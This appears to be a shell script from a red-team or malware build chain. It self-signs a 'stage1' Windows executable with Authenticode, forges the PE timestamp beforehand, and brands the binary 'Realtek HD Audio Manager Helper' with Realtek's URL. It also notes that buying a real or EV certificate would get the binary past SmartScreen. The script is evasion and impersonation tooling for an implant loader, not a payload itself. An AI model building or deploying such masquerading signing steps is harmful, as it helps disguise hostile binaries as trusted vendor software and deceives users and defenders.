#!/usr/bin/env bash
#
# Self-sign a stage1 PE with a lab-local Authenticode cert (S34 cosmetic
# layer). Idempotent: generates the CA + code-signing cert on first run,
# reuses them on subsequent runs. Private key material lives in
# sign-cert/ (gitignored).
#
# Usage:  ./sign.sh <path/to/stage1.exe>
#
# Also runs the post-link timestamp rewrite (tools/set_timestamp.py)
# BEFORE signing -- the PE TimeDateStamp is inside the Authenticode hash
# range, so rewriting after signing would invalidate the signature.
#
# Production swap: replace the generated cert with a real code-signing
# cert (SSL.com $129/yr, Certum Cloud ~$116/yr, or EV for SmartScreen).
# Same osslsigncode command, different -certs / -key paths.

set -eu

PE="${1:-}"
if [[ -z "${PE}" ]]; then
    echo "usage: $0 <pe-file>" >&2
    exit 2
fi
if [[ ! -f "${PE}" ]]; then
    echo "error: ${PE} not found" >&2
    exit 2
fi

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CERT_DIR="${SCRIPT_DIR}/sign-cert"
mkdir -p "${CERT_DIR}"

CA_KEY="${CERT_DIR}/ca.key"
CA_CRT="${CERT_DIR}/ca.crt"
SIGN_KEY="${CERT_DIR}/sign.key"
SIGN_CSR="${CERT_DIR}/sign.csr"
SIGN_CRT="${CERT_DIR}/sign.crt"

CA_SUBJ='/CN=Oxide Research CA/O=Oxide Research'
SIGN_SUBJ='/CN=Oxide Labs Code Signing/O=Oxide Research'

# --- Generate lab CA + code-signing cert if missing ----------------
if [[ ! -f "${CA_CRT}" ]]; then
    echo "[sign.sh] Generating lab CA + code-signing cert..."
    openssl genrsa -out "${CA_KEY}" 4096 2>/dev/null
    openssl req -x509 -new -nodes -key "${CA_KEY}" -sha256 -days 3650 \
        -subj "${CA_SUBJ}" -out "${CA_CRT}" 2>/dev/null

    openssl genrsa -out "${SIGN_KEY}" 4096 2>/dev/null
    openssl req -new -key "${SIGN_KEY}" -subj "${SIGN_SUBJ}" \
        -out "${SIGN_CSR}" 2>/dev/null

    # Extensions for code-signing EKU
    cat > "${CERT_DIR}/sign.ext" <<'EOF'
basicConstraints=CA:FALSE
keyUsage=digitalSignature
extendedKeyUsage=codeSigning
EOF

    openssl x509 -req -in "${SIGN_CSR}" -CA "${CA_CRT}" -CAkey "${CA_KEY}" \
        -CAcreateserial -out "${SIGN_CRT}" -days 365 -sha256 \
        -extfile "${CERT_DIR}/sign.ext" 2>/dev/null
    echo "[sign.sh] Cert generated: ${SIGN_CRT}"
fi

# --- Timestamp rewrite (pre-sign) ---------------------------------
if [[ -f "${SCRIPT_DIR}/tools/set_timestamp.py" ]]; then
    echo "[sign.sh] Rewriting TimeDateStamp..."
    python3 "${SCRIPT_DIR}/tools/set_timestamp.py" "${PE}"
fi

# --- Sign ---------------------------------------------------------
if ! command -v osslsigncode >/dev/null 2>&1; then
    echo "[sign.sh] osslsigncode not installed -- install via 'pacman -S osslsigncode' or AUR." >&2
    echo "[sign.sh] Skipping signing. Binary remains unsigned." >&2
    exit 3
fi

OUT="${PE%.exe}-signed.exe"
echo "[sign.sh] Signing ${PE} -> ${OUT}..."
osslsigncode sign \
    -certs "${SIGN_CRT}" \
    -key "${SIGN_KEY}" \
    -h sha256 \
    -n "Realtek HD Audio Manager Helper" \
    -i "https://www.realtek.com" \
    -in "${PE}" \
    -out "${OUT}"

# Replace original with signed version (signing is the final step)
mv "${OUT}" "${PE}"
echo "[sign.sh] Signed: ${PE}"

osslsigncode verify "${PE}" 2>&1 | head -20 || true
